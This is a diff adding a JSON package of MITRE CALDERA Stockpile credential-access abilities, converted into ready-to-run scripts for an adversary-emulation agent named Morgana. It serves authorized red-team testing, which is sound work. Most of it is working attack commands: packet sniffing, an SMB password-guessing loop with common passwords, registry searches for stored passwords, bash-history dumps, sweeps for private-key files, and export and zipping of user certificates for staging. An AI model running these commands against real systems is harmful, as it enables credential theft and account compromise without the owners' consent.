@@ -1,0 +1,486 @@
+{
+  "package_id": "stockpile-credaccess-v1",
+  "package_name": "STOCKPILE - Credential Access Pack (MITRE)",
+  "version": "1.0.0",
+  "description": "MITRE CALDERA Stockpile command-based abilities converted to Morgana-native scripts for Credential Access (TA0006). CALDERA is not required at runtime.",
+  "author": "MITRE (converted by X3M.AI for Morgana)",
+  "created": "2026-04-30",
+  "source": "mitre-stockpile",
+  "source_repository": "https://github.com/mitre/stockpile",
+  "source_commit": "996ec41cd1c5d1c7cc09e620fc55dabe5aefd9cc",
+  "mitre_domain": "enterprise-attack",
+  "mitre_tactic": "Credential Access (TA0006)",
+  "mitre_tactic_name": "Credential Access",
+  "mitre_tactic_source": "credential-access",
+  "mitre_tcodes": [
+    "T1040",
+    "T1110.001",
+    "T1552.002",
+    "T1552.003",
+    "T1552.004",
+    "T1649"
+  ],
+  "platform": [
+    "linux",
+    "macos",
+    "windows"
+  ],
+  "prerequisites": [
+    "Morgana agent installed on the authorized target",
+    "Required Stockpile facts supplied as Morgana tag values",
+    "CALDERA and Stockpile are not required at runtime"
+  ],
+  "license": "Apache-2.0",
+  "tag_categories": [
+    {
+      "category_id": "stockpile_credaccess_1110_001",
+      "label": "T1110.001 Stockpile Parameters",
+      "description": "Input parameters for MITRE Stockpile T1110.001 abilities.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "T1110.001"
+      ],
+      "tags": [
+        {
+          "key": "stockpile_credaccess_1110_001_remote_host_fqdn",
+          "label": "Remote Host Fqdn",
+          "description": "MITRE Stockpile fact: remote.host.fqdn",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": true
+        }
+      ]
+    },
+    {
+      "category_id": "stockpile_credaccess_1649",
+      "label": "T1649 Stockpile Parameters",
+      "description": "Input parameters for MITRE Stockpile T1649 abilities.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "T1649"
+      ],
+      "tags": [
+        {
+          "key": "stockpile_credaccess_1649_host_dir_staged",
+          "label": "Host Dir Staged",
+          "description": "MITRE Stockpile fact: host.dir.staged",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": true
+        }
+      ]
+    }
+  ],
+  "scripts": [
+    {
+      "id": "STOCKPILE - T1040 - Sniff network traffic [Windows/PowerShell]",
+      "name": "STOCKPILE - T1040 - Sniff network traffic [Windows/PowerShell]",
+      "description": "Perform a packet capture",
+      "tactic": "Credential Access",
+      "tcode": "T1040",
+      "technique_name": "Network Sniffing",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "$path = \"$ENV:UserProfile\\Desktop\\pcap.etl\";\nNew-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath $path;\nAdd-NetEventProvider -Name \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\";\nStart-NetEventSession -Name \"PCAP\";\nStart-Sleep -s 60;\nStop-NetEventSession -Name \"PCAP\";\nif (Test-Path $path) {\n  echo $path;\n  exit 0;\n} else {\n  echo \"Failed to generate PCAP file.\";\n  exit 1;\n};",
+      "cleanup_command": "Remove-NetEventSession -Name \"PCAP\";\nRemove-Item $ENV:UserProfile\\Desktop\\pcap.etl;",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7",
+      "source_path": "data/abilities/credential-access/1b4fb81c-8090-426c-93ab-0a633e7a16a7.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1040 - Sniff network traffic [macOS/Bash]",
+      "name": "STOCKPILE - T1040 - Sniff network traffic [macOS/Bash]",
+      "description": "Perform a packet capture",
+      "tactic": "Credential Access",
+      "tcode": "T1040",
+      "technique_name": "Network Sniffing",
+      "executor": "bash",
+      "platform": "macos",
+      "required_tags": [],
+      "command": "tcpdump -i en0 & sleep 5; kill $!",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7",
+      "source_path": "data/abilities/credential-access/1b4fb81c-8090-426c-93ab-0a633e7a16a7.yml",
+      "source_executor": "sh",
+      "source_platform": "darwin"
+    },
+    {
+      "id": "STOCKPILE - T1110.001 - Brute Force Credentials of single Active Directory domain users via SMB (Gene... [Windows/PowerShell]",
+      "name": "STOCKPILE - T1110.001 - Brute Force Credentials of single Active Directory domain users via SMB (Gene... [Windows/PowerShell]",
+      "description": "Ability for Brute Force: Password Guessing (ATT&CK T1110.001).\nAttempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a remote machine\nGenerated from Atomic Red Team procedures (09480053-2f98-4854-be6e-71ae5f672224); review and test safely before use.",
+      "tactic": "Credential Access",
+      "tcode": "T1110.001",
+      "technique_name": "Brute Force: Password Guessing",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "stockpile_credaccess_1110_001_remote_host_fqdn"
+      ],
+      "command": "echo Password1 > passwords.txt;\necho 1q2w3e4r >> passwords.txt;\necho Password! >> passwords.txt;\necho Spring2022 >> passwords.txt;\necho ChangeMe! >> passwords.txt;\nforeach($passw in Get-Content \".\\passwords.txt\") {\n  net use '\\\\#{stockpile_credaccess_1110_001_remote_host_fqdn}\\IPC$' /user:\"$env:USERDNSDOMAIN\\$env:USERNAME\" \"$passw\" 1>$null 2>&1;\n  if ($?) {\n    echo [*] \"$env:USERNAME : $passw\";\n    net use /delete '\\\\#{stockpile_credaccess_1110_001_remote_host_fqdn}\\IPC$';\n    break;\n  }\n}",
+      "cleanup_command": "rm passwords.txt -force",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "f82df574-c9f4-4e19-8d1a-311ad92883fd",
+      "source_path": "data/abilities/credential-access/f82df574-c9f4-4e19-8d1a-311ad92883fd.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1552.002 - Credentials in Registry - HKCU [Windows/PowerShell]",
+      "name": "STOCKPILE - T1552.002 - Credentials in Registry - HKCU [Windows/PowerShell]",
+      "description": "Search for possible credentials stored in Registry",
+      "tactic": "Credential Access",
+      "tcode": "T1552.002",
+      "technique_name": "Unsecured Credentials: Credentials in Registry",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "reg query HKCU /f password /t REG_SZ /s",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "3aad5312-d48b-4206-9de4-39866c12e60f",
+      "source_path": "data/abilities/credential-access/3aad5312-d48b-4206-9de4-39866c12e60f.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1552.002 - Credentials in Registry - HKLM [Windows/PowerShell]",
+      "name": "STOCKPILE - T1552.002 - Credentials in Registry - HKLM [Windows/PowerShell]",
+      "description": "Search for possible credentials stored in the HKLM Hive",
+      "tactic": "Credential Access",
+      "tcode": "T1552.002",
+      "technique_name": "Unsecured Credentials: Credentials in Registry",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "reg query HKLM /f password /t REG_SZ /s",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "98e58fc4-3843-4511-89b1-50cb872e0c9b",
+      "source_path": "data/abilities/credential-access/98e58fc4-3843-4511-89b1-50cb872e0c9b.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1552.003 - Dump bash history [Linux/Bash]",
+      "name": "STOCKPILE - T1552.003 - Dump bash history [Linux/Bash]",
+      "description": "Get contents of bash history",
+      "tactic": "Credential Access",
+      "tcode": "T1552.003",
+      "technique_name": "Unsecured Credentials: Bash History",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "command": "cat ~/.bash_history",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "422526ec-27e9-429a-995b-c686a29561a4",
+      "source_path": "data/abilities/credential-access/422526ec-27e9-429a-995b-c686a29561a4.yml",
+      "source_executor": "sh",
+      "source_platform": "linux"
+    },
+    {
+      "id": "STOCKPILE - T1552.003 - Dump bash history [macOS/Bash]",
+      "name": "STOCKPILE - T1552.003 - Dump bash history [macOS/Bash]",
+      "description": "Get contents of bash history",
+      "tactic": "Credential Access",
+      "tcode": "T1552.003",
+      "technique_name": "Unsecured Credentials: Bash History",
+      "executor": "bash",
+      "platform": "macos",
+      "required_tags": [],
+      "command": "find ~/.bash_sessions -name '*' -exec cat {} \\; 2>/dev/null",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "422526ec-27e9-429a-995b-c686a29561a4",
+      "source_path": "data/abilities/credential-access/422526ec-27e9-429a-995b-c686a29561a4.yml",
+      "source_executor": "sh",
+      "source_platform": "darwin"
+    },
+    {
+      "id": "STOCKPILE - T1552.004 - Find private keys [Linux/Bash]",
+      "name": "STOCKPILE - T1552.004 - Find private keys [Linux/Bash]",
+      "description": "Find private keys on the file system",
+      "tactic": "Credential Access",
+      "tcode": "T1552.004",
+      "technique_name": "Unsecured Credentials: Private Keys",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /etc -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "de632c2d-a729-4b77-b781-6a6b09c148ba",
+      "source_path": "data/abilities/credential-access/de632c2d-a729-4b77-b781-6a6b09c148ba.yml",
+      "source_executor": "sh",
+      "source_platform": "linux"
+    },
+    {
+      "id": "STOCKPILE - T1552.004 - Find private keys [Windows/CMD]",
+      "name": "STOCKPILE - T1552.004 - Find private keys [Windows/CMD]",
+      "description": "Find private keys on the file system",
+      "tactic": "Credential Access",
+      "tcode": "T1552.004",
+      "technique_name": "Unsecured Credentials: Private Keys",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "for %i in (\\.key \\.pgp \\.gpg \\.ppk \\.p12 \\.pem \\.pfx \\.cer \\.p7b \\.asc) do (dir c:\\ /b /s .key | findstr /e \"%i\")",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "de632c2d-a729-4b77-b781-6a6b09c148ba",
+      "source_path": "data/abilities/credential-access/de632c2d-a729-4b77-b781-6a6b09c148ba.yml",
+      "source_executor": "cmd",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1552.004 - Find private keys [Windows/PowerShell]",
+      "name": "STOCKPILE - T1552.004 - Find private keys [Windows/PowerShell]",
+      "description": "Find private keys on the file system",
+      "tactic": "Credential Access",
+      "tcode": "T1552.004",
+      "technique_name": "Unsecured Credentials: Private Keys",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "foreach($i in @(\".key\",\".pgp\",\".gpg\",\".ppk\",\".p12\",\".pem\",\".pfx\",\".cer\",\".p7b\",\".asc\",\".crt\")){Get-ChildItem -Path c:\\ -Depth 3 -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.name -Match \"$i$\"}}",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "de632c2d-a729-4b77-b781-6a6b09c148ba",
+      "source_path": "data/abilities/credential-access/de632c2d-a729-4b77-b781-6a6b09c148ba.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1552.004 - Find private keys [macOS/Bash]",
+      "name": "STOCKPILE - T1552.004 - Find private keys [macOS/Bash]",
+      "description": "Find private keys on the file system",
+      "tactic": "Credential Access",
+      "tcode": "T1552.004",
+      "technique_name": "Unsecured Credentials: Private Keys",
+      "executor": "bash",
+      "platform": "macos",
+      "required_tags": [],
+      "command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /Users -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "de632c2d-a729-4b77-b781-6a6b09c148ba",
+      "source_path": "data/abilities/credential-access/de632c2d-a729-4b77-b781-6a6b09c148ba.yml",
+      "source_executor": "sh",
+      "source_platform": "darwin"
+    },
+    {
+      "id": "STOCKPILE - T1649 - Staging Local Certificates via Export-Certificate (Generated from Atomic Red... [Windows/PowerShell]",
+      "name": "STOCKPILE - T1649 - Staging Local Certificates via Export-Certificate (Generated from Atomic Red... [Windows/PowerShell]",
+      "description": "Ability for Steal or Forge Authentication Certificates (ATT&CK T1649).\nGenerated from Atomic Red Team procedures (eb121494-82d1-4148-9e2b-e624e03fbf3d); review and test safely before use.",
+      "tactic": "Credential Access",
+      "tcode": "T1649",
+      "technique_name": "Steal or Forge Authentication Certificates",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "stockpile_credaccess_1649_host_dir_staged"
+      ],
+      "command": "$archive=\"#{stockpile_credaccess_1649_host_dir_staged}\\atomic_certs.zip\";\n$exfilpath=\"#{stockpile_credaccess_1649_host_dir_staged}\\certs\";\nAdd-Type -assembly \"system.io.compression.filesystem\";\nRemove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore;\nmkdir $exfilpath | Out-Null;\nforeach ($cert in (gci Cert:\\CurrentUser\\My)) {\n  Export-Certificate -Cert $cert -FilePath $exfilpath\\$($cert.FriendlyName).cer\n}\n[io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "290ecfe6-5708-4753-afc4-9404d34c71a2",
+      "source_path": "data/abilities/credential-access/290ecfe6-5708-4753-afc4-9404d34c71a2.yml",
+      "source_executor": "psh",
+      "source_platform": "windows",
+      "source_requirements": [
+        {
+          "plugins.stockpile.app.requirements.paw_provenance": [
+            {
+              "source": "host.dir.staged"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "chains": [
+    {
+      "name": "STOCKPILE - T1040 - Sniff network traffic [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1040 - Network Sniffing.",
+      "package": "stockpile-credaccess-v1",
+      "tcode": "T1040",
+      "tactic": "Credential Access",
+      "script_refs": [
+        "STOCKPILE - T1040 - Sniff network traffic [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1040 - Sniff network traffic [macOS/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1040 - Network Sniffing.",
+      "package": "stockpile-credaccess-v1",
+      "tcode": "T1040",
+      "tactic": "Credential Access",
+      "script_refs": [
+        "STOCKPILE - T1040 - Sniff network traffic [macOS/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1110.001 - Brute Force Credentials of single Active Directory domain users via SMB (Gene... [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1110.001 - Brute Force: Password Guessing.",
+      "package": "stockpile-credaccess-v1",
+      "tcode": "T1110.001",
+      "tactic": "Credential Access",
+      "script_refs": [
+        "STOCKPILE - T1110.001 - Brute Force Credentials of single Active Directory domain users via SMB (Gene... [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1552.002 - Credentials in Registry - HKCU [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1552.002 - Unsecured Credentials: Credentials in Registry.",
+      "package": "stockpile-credaccess-v1",
+      "tcode": "T1552.002",
+      "tactic": "Credential Access",
+      "script_refs": [
+        "STOCKPILE - T1552.002 - Credentials in Registry - HKCU [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1552.002 - Credentials in Registry - HKLM [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1552.002 - Unsecured Credentials: Credentials in Registry.",
+      "package": "stockpile-credaccess-v1",
+      "tcode": "T1552.002",
+      "tactic": "Credential Access",
+      "script_refs": [
+        "STOCKPILE - T1552.002 - Credentials in Registry - HKLM [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1552.003 - Dump bash history [Linux/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1552.003 - Unsecured Credentials: Bash History.",
+      "package": "stockpile-credaccess-v1",
+      "tcode": "T1552.003",
+      "tactic": "Credential Access",
+      "script_refs": [
+        "STOCKPILE - T1552.003 - Dump bash history [Linux/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1552.003 - Dump bash history [macOS/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1552.003 - Unsecured Credentials: Bash History.",
+      "package": "stockpile-credaccess-v1",
+      "tcode": "T1552.003",
+      "tactic": "Credential Access",
+      "script_refs": [
+        "STOCKPILE - T1552.003 - Dump bash history [macOS/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1552.004 - Find private keys [Linux/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1552.004 - Unsecured Credentials: Private Keys.",
+      "package": "stockpile-credaccess-v1",
+      "tcode": "T1552.004",
+      "tactic": "Credential Access",
+      "script_refs": [
+        "STOCKPILE - T1552.004 - Find private keys [Linux/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1552.004 - Find private keys [Windows/CMD]",
+      "description": "Single-step MITRE Stockpile chain for T1552.004 - Unsecured Credentials: Private Keys.",
+      "package": "stockpile-credaccess-v1",
+      "tcode": "T1552.004",
+      "tactic": "Credential Access",
+      "script_refs": [
+        "STOCKPILE - T1552.004 - Find private keys [Windows/CMD]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1552.004 - Find private keys [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1552.004 - Unsecured Credentials: Private Keys.",
+      "package": "stockpile-credaccess-v1",
+      "tcode": "T1552.004",
+      "tactic": "Credential Access",
+      "script_refs": [
+        "STOCKPILE - T1552.004 - Find private keys [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1552.004 - Find private keys [macOS/Bash]",
+      "description": "Single-step MITRE Stockpile chain for T1552.004 - Unsecured Credentials: Private Keys.",
+      "package": "stockpile-credaccess-v1",
+      "tcode": "T1552.004",
+      "tactic": "Credential Access",
+      "script_refs": [
+        "STOCKPILE - T1552.004 - Find private keys [macOS/Bash]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1649 - Staging Local Certificates via Export-Certificate (Generated from Atomic Red... [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1649 - Steal or Forge Authentication Certificates.",
+      "package": "stockpile-credaccess-v1",
+      "tcode": "T1649",
+      "tactic": "Credential Access",
+      "script_refs": [
+        "STOCKPILE - T1649 - Staging Local Certificates via Export-Certificate (Generated from Atomic Red... [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - Credential Access - Full Tactic Convenience Chain",
+      "description": "Convenience collection of all 12 converted Credential Access scripts. This is not an authentic MITRE CALDERA adversary profile or validated operation sequence.",
+      "package": "stockpile-credaccess-v1",
+      "tcode": "T1040",
+      "tactic": "Credential Access",
+      "script_refs": [
+        "STOCKPILE - T1040 - Sniff network traffic [Windows/PowerShell]",
+        "STOCKPILE - T1040 - Sniff network traffic [macOS/Bash]",
+        "STOCKPILE - T1110.001 - Brute Force Credentials of single Active Directory domain users via SMB (Gene... [Windows/PowerShell]",
+        "STOCKPILE - T1552.002 - Credentials in Registry - HKCU [Windows/PowerShell]",
+        "STOCKPILE - T1552.002 - Credentials in Registry - HKLM [Windows/PowerShell]",
+        "STOCKPILE - T1552.003 - Dump bash history [Linux/Bash]",
+        "STOCKPILE - T1552.003 - Dump bash history [macOS/Bash]",
+        "STOCKPILE - T1552.004 - Find private keys [Linux/Bash]",
+        "STOCKPILE - T1552.004 - Find private keys [Windows/CMD]",
+        "STOCKPILE - T1552.004 - Find private keys [Windows/PowerShell]",
+        "STOCKPILE - T1552.004 - Find private keys [macOS/Bash]",
+        "STOCKPILE - T1649 - Staging Local Certificates via Export-Certificate (Generated from Atomic Red... [Windows/PowerShell]"
+      ]
+    }
+  ]
+}
